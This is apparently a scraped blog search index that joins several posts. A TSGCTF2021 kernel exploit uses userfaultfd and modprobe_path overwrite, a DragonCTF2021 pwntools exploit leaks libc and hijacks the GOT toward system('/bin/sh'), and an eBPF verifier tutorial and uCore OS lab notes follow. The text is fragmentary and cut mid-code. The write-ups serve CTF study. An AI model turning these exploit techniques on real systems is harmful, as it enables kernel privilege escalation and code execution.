\u003csys/ioctl.h\u003e#include \u003csys/mman.h\u003e#include \u003csys/types.h\u003e#include \u003csys/xattr.h\u003e#include \u003csys/socket.h\u003e#include \u003csys/uio.h\u003e#include \u003csys/shm.h\u003e#include \u003cmalloc.h\u003e #include \"./src/include/lkgit.h\" #define PAGE_SIZE 4096 void die(const char *msg) { fprintf(stderr,msg,strlen(msg),0); exit(-1); } int global_fd; int fds[0x80]; void *basepage = NULL; uint64_t kernbase = 0; uint64_t modprobe_path = 0; hash_object *req = NULL; log_object *logobj = NULL; char* hash_to_string(char *hash) { char *hash_str = calloc(HASH_SIZE * 2 + 1, 1); for(int ix = 0; ix != HASH_SIZE; ++ix) { sprintf(hash_str + ix*2, \"%02lx\", (unsigned long)(unsigned char)hash[ix]); } return hash_str; } static void fault_handler_thread(void *arg) { puts(\"[+] entered fault_handler_thread!\"); static struct uffd_msg msg; static int fault_cnt = 0; struct uffdio_copy uc; uint64_t uffd = (uint64_t)arg; struct pollfd pollfd; int nready; pollfd.fd = uffd; pollfd.events = POLLIN; puts(\"[+] polling...\"); while ((nready = poll(\u0026pollfd, 1, -1)) \u003e 0) { if (pollfd.revents \u0026 POLLERR || pollfd.revents \u0026 POLLHUP) { die(\"[!] poll failed\\n\"); } if ((read(uffd, \u0026msg, sizeof(msg))) == 0) { die(\"[!] read uffd msg failed\\n\"); } if (msg.event != UFFD_EVENT_PAGEFAULT) { die(\"[!] unexpected pagefault\\n\"); } printf(\"[+] page fault: %p\\n\", (void *)msg.arg.pagefault.address); if (fault_cnt++ == 0) { // fisrt page fault, we free this object and leak kernel address puts(\"[+] Now free this object\"); ioctl(global_fd, LKGIT_HASH_OBJECT, req); puts(\"[+] heap spray...\"); for (int i = 0; i \u003c 0x80; i++) { fds[i] = open(\"/proc/self/stat\", O_RDONLY); } } else { // second page fault, we free it and allocate a new one. // new object's message will point to the target we are appending. puts(\"[+] Now free this object\"); ioctl(global_fd, LKGIT_HASH_OBJECT, req); puts(\"[+] Allocate new object\"); for (int i = 0; i \u003c MESSAGE_MAXSZ / sizeof(uint64_t); i++) { *((uint64_t *)req-\u003emessage + i) = modprobe_path; } ioctl(global_fd, LKGIT_HASH_OBJECT, req); } // use uffdio_copy to write request's message uc.src = (unsigned long)basepage; uc.len = PAGE_SIZE; uc.dst = (unsigned long)msg.arg.pagefault.address \u0026 ~(PAGE_SIZE - 1); uc.mode = 0; uc.copy = 0; if (ioctl(uffd, UFFDIO_COPY, \u0026uc) == -1) { die(\"[!] ioctl-UFFDIO_COPY\"); } break; } puts(\"[+] exit fault_handler_thread!\"); } void get_flag(void){ puts(\"[*] Setting up for fake modprobe\"); system(\"echo '#!/bin/sh\\nchmod 777 /home/user/flag' \u003e /tmp/niebelungen\"); system(\"chmod +x /tmp/niebelungen\"); system(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' \u003e /tmp/dummy\"); system(\"chmod +x /tmp/dummy\"); puts(\"[*] Run unknown file\"); system(\"/tmp/dummy\"); puts(\"[*] Hopefully flag is readable\"); system(\"cat /home/user/flag\"); exit(0); } void RegisterUserfault(void *fault_page,void *handler) { pthread_t phr; struct uffdio_api ua; struct uffdio_register ur; uint64_t uufd; int s; uufd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); if (uufd \u003c 0) { die(\"[!] Failed to register userfaultfd\\n\"); } ua.api = UFFD_API; ua.features = 0; if (ioctl(uufd, UFFDIO_API, \u0026ua) == -1) { die(\"[!] Failed ioctl UFFDIO_API\\n\"); } ur.range.start = (unsigned long) fault_page; ur.range.len = PAGE_SIZE; ur.mode = UFFDIO_REGISTER_MODE_MISSING; if (ioctl(uufd, UFFDIO_REGISTER, \u0026ur) == -1) { die(\"[!] Failed ioctl UFFDIO_REGISTER\\n\"); } s = pthread_create(\u0026phr, NULL, handler, (void *)uufd); if (s != 0) { die(\"[!] Failed pthread_create\\n\"); } } int main() { global_fd = open(\"/dev/lkgit\", O_RDWR); if(global_fd \u003c 0) { die(\"[!] Couldn't open /dev/lkgit\\n\"); } // part 1: UAF ","date":"2022-01-17","objectID":"/tsgctf2021-lkgit-userfaultfd/:0:0","series":null,"tags":["Writeups","Kernel"],"title":"TSGCTF2021-lkgit(userfaultfd)","uri":"/tsgctf2021-lkgit-userfaultfd/#the-full-exp"},{"categories":["Pwning"],"content":"eBPF","date":"2022-01-17","objectID":"/ebpf-basic-learning/:0:0","series":null,"tags":["Pwn"],"title":"eBPF-Basic-Learning","uri":"/ebpf-basic-learning/#ebpf"},{"categories":["Pwning"],"content":"What is eBPF ？eBPF 全称是 extended Berkeley Packet Filter ，起源于 BPF ( Berkeley Packet Filter )。顾名思义，它向linux内核提供了对数据包的过滤。 早期的网络监控器等都是作为用户级进程运行的。为了分析只在内核空间运行的数据，它们必须将这些数据从内核空间复制到用户空间的内存中去，并进行上下文切换。这与直接在内核空间分析这些数据相比，导致了巨大的性能开销。 BPF 就是解决这一问题的一种在内核空间执行高效安全的程序的机制。 BPF 在数据包过滤上引入了两大革新： 一个新的虚拟机 (VM) 设计，可以有效地工作在基于寄存器结构的 CPU 之上； 应用程序使用缓存只复制与过滤数据包相关的数据，不会复制数据包的所有信息，最大程度地减少BPF 处理的数据，提高处理效率； 发展到今天，BPF 升级为 eBPF 。它演进成为了一套通用执行引擎，提供可基于系统或程序事件高效安全执行特定代码的通用能力，通用能力的使用者不再局限于内核开发者。原来的 BPF 被称为 cBPF （classic BPF）已被舍弃。 下面是 eBPF 的大致原理图： 用户可以通过创建内核探针（kprobe）或用户探针（uprobe）在几乎任何地方附加eBPF程序。 在我刚开始阅读 eBPF 的相关资料时，就在想，这不就是一个数据过滤吗。但是现在想想吧，你可以在几乎内核的任何地方加入自己的代码。向内核加入用户输入，这本身就是一个大胆创新的想法，而加入自己的程序这是多么令人激动！ ","date":"2022-01-17","objectID":"/ebpf-basic-learning/:0:0","series":null,"tags":["Pwn"],"title":"eBPF-Basic-Learning","uri":"/ebpf-basic-learning/#what-is-ebpf-"},{"categories":["Pwning"],"content":"How does it work ？正如原理图中展示的那样，用户需要首先使用 eBPF 指令集编写相应的 eBPF 程序，然后将程序字节码和程序类型送入内核，程序类型决定了可以访问的内核区域（各种Helper Calls）。 ","date":"2022-01-17","objectID":"/ebpf-basic-learning/:0:0","series":null,"tags":["Pwn"],"title":"eBPF-Basic-Learning","uri":"/ebpf-basic-learning/#how-does-it-work-"},{"categories":["Pwning"],"content":"验证为了确保安全，内核首先对传入的程序进行验证。 第一轮检查程序是否为一个有向无环图DAG，第二轮检查，它会拒绝下面的程序： 指令个数大于BPF_MAXINSNS（4096） 有循环 有无法到达的指令（程序结构只能是一个函数不能是森林） 越界或畸形跳跃 每个寄存器状态都有一个类型， NOT_INIT：该寄存器还未写入数据 SCALAR_VALUE：标量值，不可作为指针 指针类型 依据它们指向的数据结构类型，又可以分为： PTR_TO_CTX：指向 bpf_context 的指针。 CONST_PTR_TO_MAP：指向 struct bpf_map 的指针。 是常量（const），因为不允许对这种类型指针进行算术操作。 PTR_TO_MAP_VALUE：指向 bpf map 元素的指针。 PTR_TO_MAP_VALUE_OR_NULL：指向 bpf map 元素的指针，可为 NULL。 访问 map 的操作会返回这种类型的指针。禁止算术操作。 PTR_TO_STACK：帧指针（Frame pointer）。 PTR_TO_PACKET：指向 skb-\u003edata 的指针。 PTR_TO_PACKET_END：指向 skb-\u003edata + headlen 的指针。禁止算术操作。 PTR_TO_SOCKET：指向 struct bpf_sock_ops 的指针，内部有引用计数。 PTR_TO_SOCKET_OR_NULL：指向 struct bpf_sock_ops 的指针，或 NULL。 socket lookup 操作会返回这种类型。有引用计数， 因此程序在执行结束时，必须通过 socket release 函数释放引用。禁止算术操作。 这些指针都称为 base 指针 ","date":"2022-01-17","objectID":"/ebpf-basic-learning/:1:0","series":null,"tags":["Pwn"],"title":"eBPF-Basic-Learning","uri":"/ebpf-basic-learning/#验证"},{"categories":["Pwning"],"content":"JIT通过验证后，它就会进入JIT编译阶段，利用Just-In-Time编译器，编译生成的是通用的字节码，它是完全可移植的，可以在x86和ARM等任意球CPU架构上加载这个字节码，这样我们能获得本地编译后的程序运行速度，而且是安全可靠的。 ","date":"2022-01-17","objectID":"/ebpf-basic-learning/:2:0","series":null,"tags":["Pwn"],"title":"eBPF-Basic-Learning","uri":"/ebpf-basic-learning/#jit"},{"categories":["Pwning"],"content":"Mapsmaps 是 eBPF 的数据存储数据库，在程序中由用户通过相应的函数创建，它支持以下类型： Hash tables, Arrays LRU (Least Recently Used) Ring Buffer Stack Trace LPM (Longest Prefix match) …… 一个定义的例子： // SEC(\"maps\") 表示将这个结构编译到一个新创建的名为 maps 的 .section struct bpf_map_def SEC(\"maps\") my_map = { .type = BPF_MAP_TYPE_ARRAY, .key_size = sizeof(u32), .value_size = sizeof(long), .max_entries = 256, }; 值得注意的是： BPF Map是可以被用户空间访问并操作的 BPF Map是可以与BPF程序分离的，即当创建一个BPF Map的BPF程序运行结束后，该BPF Map还能存在，而不是随着程序一起消亡 ","date":"2022-01-17","objectID":"/ebpf-basic-learning/:3:0","series":null,"tags":["Pwn"],"title":"eBPF-Basic-Learning","uri":"/ebpf-basic-learning/#maps"},{"categories":["Pwning"],"content":"Helper Calls在 eBPF 的程序中不能直接调用内核函数。因为内核版本不断更新，很多函数会发生变化，这可能导致 eBPF 的失效。为了避免这样，内核提供了 helper calls 的 API，无需了解其实现，只需使用即可。另一方面，这也拓展了 eBPF 的功能。 bpf-helpers(7) - Linux manual page ","date":"2022-01-17","objectID":"/ebpf-basic-learning/:4:0","series":null,"tags":["Pwn"],"title":"eBPF-Basic-Learning","uri":"/ebpf-basic-learning/#helper-calls"},{"categories":["Pwning"],"content":"指令集eBPF 的指令结构如下： struct bpf_insn { __u8 code; /* opcode */ __u8 dst_reg:4; /* dest register */ __u8 src_reg:4; /* source register */ __s16 off; /* signed offset */ __s32 imm; /* signed immediate constant */ }; 在 eBPF 中有 11 个 64位寄存器 R0-R10 R0 返回值寄存器 R1-R5 函数参数 R6-R9 被调用函数保留 R10 只读栈帧寄存器 其栈的大小固定为512字节。当一个 eBPF 程序启动时，R1 中的地址指向 context 上下文（当前情况下为数据包缓冲区） ","date":"2022-01-17","objectID":"/ebpf-basic-learning/:0:0","series":null,"tags":["Pwn"],"title":"eBPF-Basic-Learning","uri":"/ebpf-basic-learning/#指令集"},{"categories":["Pwning"],"content":"opcode 结构 +-------------------------+--------------------+ | 5 bits | 3 bits | | xxxxxx | instruction class | +-------------------------+--------------------+ (MSB) (LSB) op字段的低3位，决定指令类型。 Code: include/uapi/linux/bpf.h #define BPF_CLASS(code) ((code) \u0026 0x07) #define BPF_LD 0x00 #define BPF_LDX 0x01 #define BPF_ST 0x02 #define BPF_STX 0x03 #define BPF_ALU 0x04 #define BPF_JMP 0x05 #define BPF_JMP32 0x06 /* jmp mode in word width */#define BPF_ALU64 0x07 /* alu mode in double word width */ BPF_LD, BPF_LDX: 两个类都用于加载操作。BPF_LD用于加载双字。后者是从 cBPF 继承而来的，主要是为了保持 cBPF 到 BPF 的转换效率，因为它们优化了 JIT 代码。 BPF_ST, BPF_STX: 两个类都用于存储操作，用于将数据从寄存器到存储器中。 BPF_ALU, BPF_ALU64: 分别是32位和64位下的ALU操作。 BPF_JMP和BPF_JMP32：跳转指令。JMP32的跳转范围是32位大小(一个 word) ","date":"2022-01-17","objectID":"/ebpf-basic-learning/:1:0","series":null,"tags":["Pwn"],"title":"eBPF-Basic-Learning","uri":"/ebpf-basic-learning/#opcode-结构"},{"categories":["Pwning"],"content":"加载和存储指令此时： +--------+--------+-------------------+ | 3 bits | 2 bits | 3 bits | | mode | size | instruction class | +--------+--------+-------------------+ (MSB) (LSB) size决定了操作数据的大小 BPF_W 0x00 /* word=4 byte */ BPF_H 0x08 /* half word */ BPF_B 0x10 /* byte */ BPF_DW 0x18 /* eBPF only, double word */ mode BPF_IMM 0x00 /* used for 32-bit mov in classic BPF and 64-bit in eBPF */ BPF_ABS 0x20 BPF_IND 0x40 BPF_MEM 0x60 BPF_LEN 0x80 /* classic BPF only, reserved in eBPF */ BPF_MSH 0xa0 /* classic BPF only, reserved in eBPF */ BPF_ATOMIC 0xc0 /* eBPF only, atomic operations */ ","date":"2022-01-17","objectID":"/ebpf-basic-learning/:1:1","series":null,"tags":["Pwn"],"title":"eBPF-Basic-Learning","uri":"/ebpf-basic-learning/#加载和存储指令"},{"categories":["Pwning"],"content":"跳转与运算指令此时： +----------------+--------+--------------------+ | 4 bits | 1 bit | 3 bits | | operation code | source | instruction class | +----------------+--------+--------------------+ (MSB) (LSB) #define BPF_SRC(code) ((code) \u0026 0x08) BPF_K 0x00 BPF_X 0x08 BPF_SRC(code) == BPF_X - use 'src_reg' register as source operand BPF_SRC(code) == BPF_K - use 32-bit immediate as source operand 可以使用以下宏定义快速的编写指令，Code: samples/bpf/bpf_insn.h： /* SPDX-License-Identifier: (GPL-2.0-only OR BSD-2-Clause) */ /* eBPF instruction mini library */ #ifndef __BPF_INSN_H #define __BPF_INSN_H struct bpf_insn; /* ALU ops on registers, bpf_add|sub|...: dst_reg += src_reg */ #define BPF_ALU64_REG(OP, DST, SRC) \\ ((struct bpf_insn) { \\ .code = BPF_ALU64 | BPF_OP(OP) | BPF_X, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = 0 }) #define BPF_ALU32_REG(OP, DST, SRC) \\ ((struct bpf_insn) { \\ .code = BPF_ALU | BPF_OP(OP) | BPF_X, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = 0 }) /* ALU ops on immediates, bpf_add|sub|...: dst_reg += imm32 */ #define BPF_ALU64_IMM(OP, DST, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_ALU64 | BPF_OP(OP) | BPF_K, \\ .dst_reg = DST, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) #define BPF_ALU32_IMM(OP, DST, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_ALU | BPF_OP(OP) | BPF_K, \\ .dst_reg = DST, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) /* Short form of mov, dst_reg = src_reg */ #define BPF_MOV64_REG(DST, SRC) \\ ((struct bpf_insn) { \\ .code = BPF_ALU64 | BPF_MOV | BPF_X, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = 0 }) #define BPF_MOV32_REG(DST, SRC) \\ ((struct bpf_insn) { \\ .code = BPF_ALU | BPF_MOV | BPF_X, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = 0 }) /* Short form of mov, dst_reg = imm32 */ #define BPF_MOV64_IMM(DST, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_ALU64 | BPF_MOV | BPF_K, \\ .dst_reg = DST, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) #define BPF_MOV32_IMM(DST, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_ALU | BPF_MOV | BPF_K, \\ .dst_reg = DST, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) /* BPF_LD_IMM64 macro encodes single 'load 64-bit immediate' insn */ #define BPF_LD_IMM64(DST, IMM) \\ BPF_LD_IMM64_RAW(DST, 0, IMM) #define BPF_LD_IMM64_RAW(DST, SRC, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_LD | BPF_DW | BPF_IMM, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = (__u32) (IMM) }), \\ ((struct bpf_insn) { \\ .code = 0, /* zero is reserved opcode */\\ .dst_reg = 0, \\ .src_reg = 0, \\ .off = 0, \\ .imm = ((__u64) (IMM)) \u003e\u003e 32 }) #ifndef BPF_PSEUDO_MAP_FD # define BPF_PSEUDO_MAP_FD 1 #endif /* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */ #define BPF_LD_MAP_FD(DST, MAP_FD) \\ BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD) /* Direct packet access, R0 = *(uint *) (skb-\u003edata + imm32) */ #define BPF_LD_ABS(SIZE, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_LD | BPF_SIZE(SIZE) | BPF_ABS, \\ .dst_reg = 0, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) /* Memory load, dst_reg = *(uint *) (src_reg + off16) */ #define BPF_LDX_MEM(SIZE, DST, SRC, OFF) \\ ((struct bpf_insn) { \\ .code = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = OFF, \\ .imm = 0 }) /* Memory store, *(uint *) (dst_reg + off16) = src_reg */ #define BPF_STX_MEM(SIZE, DST, SRC, OFF) \\ ((struct bpf_insn) { \\ .code = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = OFF, \\ .imm = 0 }) /* * Atomic operations: * * BPF_ADD *(uint *) (dst_reg + off16) += src_reg * BPF_AND *(uint *) (dst_reg + off16) \u0026= src_reg * BPF_OR *(uint *) (dst_reg + off16) |= src_reg * BPF_XOR *(uint *) (dst_reg + off16) ^= src_reg * BPF_ADD | BPF_FETCH src_reg = atomic_fetch_add(dst_reg + off16, src_reg); * BPF_AND | BPF_FETCH src_reg = atomic_fetch_and(dst_reg + off16, src_reg); * BPF_OR | BPF_FETCH src_reg = atomic_fetch_or(dst_reg + off16, src_reg); * BPF_XOR | BPF_FETCH src_reg = atomic_fetch_xor(dst_reg + off16, src_reg); * BPF_XCHG src_reg = atomic_xchg(dst_reg + off16, src_re","date":"2022-01-17","objectID":"/ebpf-basic-learning/:1:2","series":null,"tags":["Pwn"],"title":"eBPF-Basic-Learning","uri":"/ebpf-basic-learning/#跳转与运算指令"},{"categories":["Pwning"],"content":"Security虽然内核对用户输入做了很多的防护，但是依然没有阻止 eBPF 作为新的内核攻击面。 ","date":"2022-01-17","objectID":"/ebpf-basic-learning/:0:0","series":null,"tags":["Pwn"],"title":"eBPF-Basic-Learning","uri":"/ebpf-basic-learning/#security"},{"categories":["Pwning"],"content":"OOB用户与内核唯一的屏障是 verify ，如果绕过那么就可以实现注入了。 eBPF 会对读取对应类型的内核缓冲区 context 和 map，这里涉及到，程序读取的值不能马上确定，而程序又要对数据进行其他的运算，如何保证得到的数据等不超界？ eBPF 寄存器结构： struct bpf_reg_state { /* Ordering of fields matters. See states_equal() */ enum bpf_reg_type type; union { /* valid when type == PTR_TO_PACKET */ u16 range; /* valid when type == CONST_PTR_TO_MAP | PTR_TO_MAP_VALUE | * PTR_TO_MAP_VALUE_OR_NULL */ struct bpf_map *map_ptr; /* Max size from any of the above. */ unsigned long raw; }; s32 off; u32 id; u32 ref_obj_id; struct tnum var_off; s64 smin_value; /* minimum possible (s64)value */ s64 smax_value; /* maximum possible (s64)value */ u64 umin_value; /* minimum possible (u64)value */ u64 umax_value; /* maximum possible (u64)value */ struct bpf_reg_state *parent; u32 frameno; s32 subreg_def; enum bpf_reg_liveness live; bool precise; }; struct tnum { u64 value; u64 mask; }; umin_value和 umax_value：当解释器将寄存器的值解释为无符号整数时的最小值和最大值 smin_value 和 smax_value：当解释器将寄存器的值解释为有符号整数时的最小值和最大值 var_off: 用来描述无法确定的值，既然有待定的值，一个位的状态就变成了三种，‘0’、‘1’和未知。如果一个数的某位是确定的，那么其在value中的值就是它的真值，对应mask中的位为0，如果某位无法确定，那么mask中对应的位为1。 例如： var_off→value = 0b010, value-\u003emask = 0b100，那么这个值就可能为0b010或0b110。 上述这五个数据可以相互更新，例如如果 umax_value 小于 2^63，则 smin_value 会被设置为 0（因为不会有负数出现），如果 var_off 指示寄存器只有最低 3 位可能为 1,则 umax_value 为 7。 ","date":"2022-01-17","objectID":"/ebpf-basic-learning/:1:0","series":null,"tags":["Pwn"],"title":"eBPF-Basic-Learning","uri":"/ebpf-basic-learning/#oob"},{"categories":["Pwning"],"content":"ReferenceLinux超能力BPF技术介绍及学习分享（附PPT） What is eBPF? An Introduction and Deep Dive into the eBPF Technology [译] Linux Socket Filtering (LSF, aka BPF)（KernelDoc，2021） ","date":"2022-01-17","objectID":"/ebpf-basic-learning/:0:0","series":null,"tags":["Pwn"],"title":"eBPF-Basic-Learning","uri":"/ebpf-basic-learning/#reference"},{"categories":["Writeups"],"content":"Nim周末和Nu1L的师傅一起打了DragonCTF，题目质量很高，被师傅们带了。 Nim实现了尼姆游戏（Nim），玩家和Dealer（电脑）轮流从堆中取石头，堆的数目大于等于8，每次只能从一个堆中取，取的数量要大于0。谁将最后一块取出即可赢得游戏。 程序有两个漏洞点可以利用： 使用rand函数地址，自己实现的伪随机数生成函数 堆的数量由玩家指定造成的栈溢出 程序开启了所有的保护，这代表着有Canary。 栈溢出很容易都能看出来，但是我并没有重视rand函数。在分析的时候，我发现这个程序是由c \u0026 c++混写的，所以我尝试用异常处理去绕过canary保护。实际的利用并不是这样。 首先，第一个堆块的石头数量为rand \u0026 0x7fffffff，可以通过模拟其随机数生成，得到rand函数的地址从而leak libc。 第二点是，game程序有八个参数，这意味着有两个参数会通过栈进行传递。二栈溢出可以对它们进行修改。注意到在游戏结束后，我们的分数如果超过记录，则会将分数（int），放到第八个参数指向的位置。Yes，我们可以任意地址写四字节数据。 之后，会触发``__stack_chk_fail，进一步执行__fortify_fail-\u003e__libc_message，__libc_message中通过libc@got调用了三个函数strchrnul， strlen和mempcpy`。libc@got可写，所以我们通过任意地址写四字节即可劫持got表。 继续分析，此时栈的0x2a8附近有我们的在游戏开始输入的name，再向下就是堆中的石头数目。通过gadget回到name中，设置堆中的石头数目为ROP，以name为跳板，执行到ROP。 0x0000000000089d27: add rsp, 0x2c0; pop rbp; pop r12; pop r13; ret; 在leak libc之后，我们不得不面对Nim游戏。满足下面条件则先手必败： $$a_1\\oplus a_2\\oplus a_3…\\oplus a_n = 0$$ 通过模拟随机数生成函数，可以预测出Dealer的所有堆块。之后只要设置我们的堆块，使所有堆块石子数目异或和为0，则Dealer面对的就是必败状态。它不得不取出石子，这样异或和改变，我们只要取出异或和数量的石子数，就能一直将必败状态留给Dealer。从而使分数到达我们的目标值。 from pwn import * leak = lambda name,addr: log.success('{0}---\u003e {1}'.format(name, hex(addr))) binary = './nim' libc = './libc.so' context.terminal = ['tmux', 'splitw', '-h'] context(binary = binary, log_level='info') # p = process(binary) p = remote('nim.hackable.software',1337) elf = ELF(binary, checksec=False) libc = ELF(libc, checksec=False) const_num1 = 0x7CC216571FEE6FB const_num2 = 0xFFFFFFFFFFFFFA3 class RandSim: seed = 0 def __init__(self): self.seed = 0 def set_seed(self, seed): self.seed = seed def get_next(self): val = self.seed \u0026 0x7fffffff self.seed = self.rand_sim(self.seed) return val def rand_sim(self,s): val = 0 min = 0x7CC216571FEE6FB while s != 0: if(s \u00261) !=0: val = (min+val) % 0xFFFFFFFFFFFFFA3 s = s \u003e\u003e 1 min = 2 * min % 0xFFFFFFFFFFFFFA3 return val Randgen = RandSim() def get_dealer(): p.recvuntil(\"Dealer has taken \") num = int(p.recvuntil(\" stone(s)\",drop=True),10) p.recvuntil(\"from heap \") idx = int(p.recvuntil(\".\\n\",drop=True),10) return num, idx def nim(heaps): sum = 0 for i in heaps: sum = sum^i if sum: for i in range(len(heaps)): val = sum^heaps[i] if val \u003c heaps[i]: return i, heaps[i]-val else: for i in range(len(heaps)): if heaps[i] !=0 : return i, heaps[i] def win(bet): heaps = [] for i in range(4): heaps.append(Randgen.get_next()) heaps.append(heaps[0]) heaps.append(heaps[1]) heaps.append(heaps[2]) heaps.append(heaps[3]) p.sendlineafter(\"game? \", str(bet)) p.sendlineafter(\"s?\", '8') for i in range(4): p.sendlineafter(\": \",str(heaps[i])) while 1: last = 0 p.recvuntil(\"The current set of heaps is: [\") heap_list = map(int, p.recvuntil(\"]\",drop=True).split(\", \")) idx, val = nim(heap_list) p.sendlineafter(\"resign): \",str(idx+1)) p.sendlineafter(\"heap: \",str(val)) if heap_list.count(0) == len(heap_list)-1: last = 1 if last: p.recvuntil(\"Current score: \") cur = int(p.recvuntil(\". C\",drop=True),10) return cur def win_game(cur,target): while 1: off = target - cur if(off\u003e=cur): cur = win(cur) else: cur = win(off) leak(\"current scores \", cur) if(cur == target): break p.sendlineafter(\"[y/n]? \",'y') def main(): global p p.sendlineafter(\"Choice: \", 'P') p.sendlineafter(\"name? \",\"Niebelungen\") # libc p.sendlineafter(\"game? \", '1') p.sendlineafter(\"?\", '8') for i in range(4): p.sendlineafter(\": \",'1') num, idx = get_dealer() p.recvuntil(\"The current set of heaps is: [\") heap_list = map(int, p.recvuntil(\"]\",drop=True).split(\", \")) heap_list[idx-1] += num rand_addr = 0 for i in range(2**10): guess = (0x7e \u003c\u003c 40) | (i \u003c\u003c 31) | heap_list[0] num = Randgen.rand_sim(guess) if (num \u0026 0x7FFFFFFF) == heap_list[1]: rand_addr = guess break libc_base = rand_addr - libc.sym[\"rand\"] Randgen.set_seed(rand_addr) for i in range(4): Randgen.get_next() leak(\"libc base\", libc_base) p.sendlineafter(\"resign): \",'0') p.sendlineafter(\"[y/n]? \",'n') # strchrnul@libc.got 0x1eb040 # strlen@libc.got 0x1eb0a8 # memcpy@libc.got 0x1eb148 # name - stack 0x2a8 # + 0x20 0x2c8 # + 0x20 0x2e8 system = libc_base + libc.sym['system'] binsh = libc_base + l","date":"2021-12-19","objectID":"/dragonctf2021-nim/:0:0","series":null,"tags":["Writeups"],"title":"DragonCTF2021-Nim","uri":"/dragonctf2021-nim/#nim"},{"categories":["Pwning"],"content":"练习0在idt_init中添加 SETGATE(idt[T_SYSCALL], 0, GD_KTEXT, __vectors[T_SYSCALL], DPL_USER); 修改定时器中断： ticks ++; if (ticks % TICK_NUM == 0) { assert(current != NULL); current-\u003eneed_resched = 1; // print_ticks(); } 在alloc_proc中多出了PCB中的一些字段需要设置 proc-\u003estate = PROC_UNINIT; proc-\u003epid = -1; proc-\u003ekstack = 0; proc-\u003eneed_resched = 0; proc-\u003eparent = NULL; proc-\u003emm = NULL; memset(\u0026proc-\u003econtext, 0, sizeof(struct context)); proc-\u003etf = NULL; proc-\u003ecr3 = boot_cr3; proc-\u003eflags = 0; memset(proc-\u003ename, 0, sizeof(proc-\u003ename)); proc-\u003ewait_state = 0; proc-\u003ecptr = proc-\u003eyptr = proc-\u003eoptr = NULL; do_fork中的链表操作由set_links实现 proc-\u003epid = get_pid(); hash_proc(proc); // list_add(proc_list.prev, \u0026proc-\u003elist_link); set_links(proc); // nr_process++; 这里我选择将进程加入到proc_list的链表尾部。因为我觉得这样的实现可以在一定程度上，让链表中的进程按照从旧到新的顺序排列。等待越久的进程优先级会越高，而从链表头可以更加方便的获得。实验中并没有对这部分的要求，但我同样通过了测试。 ","date":"2021-12-14","objectID":"/ucore-lab-5/:0:0","series":null,"tags":["Pwn"],"title":"uCore-lab-5","uri":"/ucore-lab-5/#练习0"},{"categories":["Pwning"],"content":"练习1加载应用程序并执行 在load_icode设置正确的tf字段。 tf-\u003etf_cs = USER_CS; tf-\u003etf_ds = tf-\u003etf_es = tf-\u003etf_ss = USER_DS; tf-\u003etf_esp = USTACKTOP; tf-\u003etf_eip = elf-\u003ee_entry; tf-\u003etf_eflags |= FL_IF; ret = 0; ","date":"2021-12-14","objectID":"/ucore-lab-5/:0:0","series":null,"tags":["Pwn"],"title":"uCore-lab-5","uri":"/ucore-lab-5/#练习1"},{"categories":["Pwning"],"content":"练习2父进程复制自己的内存空间给子进程 补充copy_range的实现 uintptr_t src_kvaddr = page2kva(page); uintptr_t dst_kvaddr = page2kva(npage); memcpy(dst_kvaddr, src_kvaddr, PGSIZE); page_insert(to, npage, start, perm); assert(ret == 0); ","date":"2021-12-14","objectID":"/ucore-lab-5/:0:0","series":null,"tags":["Pwn"],"title":"uCore-lab-5","uri":"/ucore-lab-5/#练习2"},{"categories":["Pwning"],"content":"练习3","date":"2021-12-14","objectID":"/ucore-lab-5/:0:0","series":null,"tags":["Pwn"],"title":"uCore-lab-5","uri":"/ucore-lab-5/#练习3"},{"categories":["Pwning"],"content":"forkfork的流程没有什么变化，不过PCB中多的数据结构和一些链表都通过set_links实现了 /** parent: proc-\u003eparent (proc is children) children: proc-\u003ecptr (proc is parent) older sibling: proc-\u003eoptr (proc is younger sibling) younger sibling: proc-\u003eyptr (proc is older sibling) **/ // set_links - set the relation links of process static void set_links(struct proc_struct *proc) { list_add(proc_list.prev, \u0026(proc-\u003elist_link)); proc-\u003eyptr = NULL; if ((proc-\u003eoptr = proc-\u003eparent-\u003ecptr) != NULL) { proc-\u003eoptr-\u003eyptr = proc; } proc-\u003eparent-\u003ecptr = proc; nr_process ++; } 根据注释 parent：如果proc是某个进程的子进程，则该指针指向其父进程 cptr：如果proc是某个子进程的父亲，则该指针指向其子进程 optr：如果该进程说某个进程的多个子进程的一个，且是被较晚创建的那一个，那么该指针指向比它更早创建的兄弟 yptr：如果该进程说某个进程的多个子进程的一个，且是被较早创建的那一个，那么该指针指向比它更晚创建的兄弟 ","date":"2021-12-14","objectID":"/ucore-lab-5/:1:0","series":null,"tags":["Pwn"],"title":"uCore-lab-5","uri":"/ucore-lab-5/#fork"},{"categories":["Pwning"],"content":"exec // do_execve - call exit_mmap(mm)\u0026put_pgdir(mm) to reclaim memory space of current process // - call load_icode to setup new memory space accroding binary prog. int do_execve(const char *name, size_t len, unsigned char *binary, size_t size) { struct mm_struct *mm = current-\u003emm; if (!user_mem_check(mm, (uintptr_t)name, len, 0)) { return -E_INVAL; } if (len \u003e PROC_NAME_LEN) { len = PROC_NAME_LEN; } char local_name[PROC_NAME_LEN + 1]; memset(local_name, 0, sizeof(local_name)); 